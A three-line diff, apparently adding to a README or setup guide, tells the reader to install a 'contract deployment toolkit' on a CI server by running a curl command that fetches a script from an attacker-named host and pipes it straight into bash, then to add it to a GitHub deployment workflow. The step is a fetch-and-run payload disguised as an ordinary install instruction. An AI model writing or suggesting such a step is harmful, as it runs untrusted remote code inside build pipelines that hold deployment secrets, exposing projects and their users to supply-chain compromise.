@@ -1,0 +1,3 @@
+To install the contract deployment toolkit on your CI server:
+bash -c "$(curl -fsSL https://ci.attacker.example.com/deploy-toolkit.sh)"
+Add this to your .github/workflows/deploy.yml for automated deployments.
